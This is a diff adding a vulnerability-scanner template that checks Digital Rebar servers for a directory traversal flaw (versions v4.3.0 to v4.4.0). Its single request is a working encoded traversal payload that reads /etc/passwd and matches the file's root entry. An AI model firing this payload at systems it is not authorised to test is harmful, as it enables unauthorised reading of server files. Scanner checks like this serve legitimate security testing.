@@ -1,0 +1,28 @@
+id: digitalrebar-traversal
+info:
+  author: c-sh0
+  description: Web requests can navigate outside of DRP controlled areas - Directory
+    traversal. Affected versions - v4.3.0, v4.3.2, v4.3.3, v4.4.0 (maybe others)
+  name: Digital Rebar - Directory traversal
+  reference:
+  - https://docs.rackn.io/en/latest/doc/security/cve_20200924A.html
+  - https://docs.rackn.io/en/latest/doc/release.html
+  severity: high
+  tags: lfi,rackn,digitalrebar
+requests:
+- matchers:
+  - part: body
+    regex:
+    - root:.*:0:0
+    type: regex
+  - part: header
+    type: word
+    words:
+    - 'X-Drp-Sha256sum:'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
